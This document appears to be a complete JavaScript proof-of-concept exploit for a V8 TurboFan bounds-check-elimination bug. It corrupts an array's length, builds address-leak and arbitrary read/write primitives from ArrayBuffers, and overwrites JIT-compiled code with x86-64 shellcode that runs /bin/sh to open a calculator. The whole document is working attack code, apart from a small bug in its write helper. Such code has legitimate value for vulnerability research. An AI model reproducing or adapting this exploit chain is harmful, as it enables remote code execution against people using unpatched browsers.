<script src="./int64.js"></script>
<script>

// Wrap Print
let print = (x) => {
    console.log(x);
}

/*
 * In this function we use the length of the arguments to calculate the number 1.
 * Turbofan things arguments are limited to a smaller number, so it will optimize
 * out the bounds checks based on our number, giving us oob read/write
 */
function opt(arg) {
  let x = arguments.length;
  tmp_arr = new Array(0x10);
  oob_double_array = new Array(2);
  oob_double_array[0] = 1.1; // Convert a2 to a PACKED_DOUBLE_ELEMENTS jsarray
  oob_double_array[1] = 1.1;

  // Overwrite the length for the DOUBLE_ELEMENTS array
  tmp_arr[(x >> 16) * 27] = 1.39064994160909e-309; // 0xffff00000000 smi
}

var a1, oob_double_array;

let small = [1.1];
let large = [1.1,1.1];
large.length = 65536;
large.fill(1.1);

for (let j = 0; j< 100000; j++) {
    opt.apply(null, small);
}

// Trigger bug
opt.apply(null, large);

if (oob_double_array.length === 2)
    throw("Bug or heap layout did not work");

print(`Length is now ${oob_double_array.length}`);

/*
 * Allocate objects we want to use with our new oob array
 */
let master_ab = new ArrayBuffer(0x4000);
let target_array = new Array(0x10);
target_array[0] = 0x41424344; // Make HOLEY_ELEMENTS
target_array[1] = master_ab;

let slave_ab = new ArrayBuffer(0x5000);

/*
 * Scan forward with our new oob array to locate our objects above
 */

print("Scanning for objects")

let master_ab_off = null;
let addr_arr_off = null;
for (let j=0; j<0x100; j++) {
    let b = Int64.from_double(oob_double_array[j]);

    // Find OOB offset to ArrayBuffer
    if (master_ab_off === null && b == '0x0000000000004000') { //0x4000 arraybuffer
        print(`ArrayBuffer Backing Store found at offset ${j+1}`);
        master_ab_off = j+1; // The backing store will be one offset more
    }

    // Find OOB offset to HOLEY_ELEMENTS array for addr_of
    if (addr_arr_off === null && b == '0x4142434400000000') {  //0x414424344 first index of target
        print(`HOLEY_ELEMENTS array[0] found at offset ${j}`);
        addr_arr_off = j;
    }

    // Once we found both break out
    if (master_ab_off !== null && addr_arr_off !== null)
        break
}

if (master_ab_off === null || addr_arr_off === null) {
    throw("Could not find offsets");
}

let addr_of = (obj) => {
    target_array[0] = obj;
    return Int64.from_double(oob_double_array[addr_arr_off]).sub(1); //sub(1) to untag pointer
}


// === Arb Write ===

/*
 * Point one array buffer at the other, we will use this
 * to modify the slave buffer and get arbitrary read and write
 */

let slave_ab_ptr = addr_of(slave_ab);
print(`slave_ab at ${slave_ab_ptr}`);

let original_master_backing_store = oob_double_array[master_ab_off]; // to aide cleanup -- backing up old ptr for later

// Overwrite Master ArrayBuffer backing store -> slave array buffer
oob_double_array[master_ab_off] = slave_ab_ptr.to_double()
let master_i32 = new Uint32Array(master_ab);

print(slave_ab)

let read_64 = (addr) => {
    let old_low = master_i32[8];
    let old_high = master_i32[9];

    master_i32[8] = addr.low;
    master_i32[9] = addr.high;
    let accessor = new Uint32Array(slave_ab);
    let res = new Int64(false, accessor[1], accessor[0]);

    // Restore the backing store
    master_i32[8] = old_low;
    master_i32[9] = old_high;
    return res;
}

let write_64 = (addr, val) => {
    let tmp_low = master_i32[8];
    let tmp_high = master_i32[9];

    master_i32[8] = addr.low;
    master_i32[9] = addr.high;
    let accessor = new Uint32Array(slave_ab);
    accessor[0] = val.low;
    accessor[1] = val.high;

    // Restore the backing store
    master_i32[8] = old_low;
    master_i32[9] = old_high;
}

print(read_64(addr_of({})))

// === JIT Overwrite ===

function target_func() { return 1 }

// Prevent inlining of jit function
for (var i = 0; i < 10000; i++) {
	target_func();
}
for (var i = 0; i < 10000; i++) {
	target_func();
}
for (var i = 0; i < 10000; i++) {
	target_func();
}
for (var i = 0; i < 10000; i++) {
	target_func();
}

let JSFunction_ptr = addr_of(target_func);
print(`JSFunction @ ${JSFunction_ptr}`);

let Code_ptr = read_64(JSFunction_ptr.add(0x30)).sub(1);
print(`Code @ ${Code_ptr}`); //points at metadata

let JIT_ptr = Code_ptr.add(0x40);
print(`JIT @ ${JIT_ptr}`); //points are real data

const POP_CALC =
    [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 72, 137, 231, 104, 44, 98, 1, 1, 129, 52, 36, 1, 1, 1, 1, 73, 137, 224, 104, 111, 100, 38, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 97, 116, 111, 114, 59, 32, 100, 111, 80, 72, 184, 101, 45, 99, 97, 108, 99, 117, 108, 80, 72, 184, 98, 105, 110, 47, 103, 110, 111, 109, 80, 72, 184, 36, 100, 32, 47, 117, 115, 114, 47, 80, 72, 184, 73, 83, 80, 76, 65, 89, 61, 58, 80, 72, 184, 104, 111, 97, 109, 105, 41, 32, 68, 80, 72, 184, 104, 111, 109, 101, 47, 36, 40, 119, 80, 72, 184, 118, 32, 72, 79, 77, 69, 61, 47, 80, 72, 184, 53, 59, 32, 100, 111, 32, 101, 110, 80, 72, 184, 49, 32, 50, 32, 51, 32, 52, 32, 80, 72, 184, 32, 100, 32, 105, 110, 32, 48, 32, 80, 72, 184, 32, 45, 99, 32, 39, 102, 111, 114, 80, 72, 184, 32, 47, 98, 105, 110, 47, 115, 104, 80, 73, 137, 225, 106, 1, 254, 12, 36, 65, 81, 65, 80, 87, 106, 59, 88, 72, 137, 230, 153, 15, 5];

master_i32[8] = JIT_ptr.low;
master_i32[9] = JIT_ptr.high;
let shell_code_writer = new Uint8Array(slave_ab);
shell_code_writer.set(POP_CALC);

target_func();
</script>
